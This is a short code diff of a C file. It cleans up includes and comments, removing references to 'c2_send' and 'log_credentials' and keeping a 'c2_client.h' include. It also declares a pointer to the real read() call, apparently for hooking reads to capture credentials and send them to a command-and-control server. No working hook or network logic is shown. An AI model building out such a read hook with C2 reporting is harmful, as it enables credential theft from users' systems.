@@ -4,8 +4,7 @@
 #include <unistd.h>
 #include <string.h>
 #include <errno.h>
-#include "c2_client.h"   // Pour c2_send(...)
-// #include "utils.h"    // Pour log_credentials(...) si besoin
+#include "c2_client.h"   
 
 static ssize_t (*real_read)(int, void*, size_t) = NULL;
 
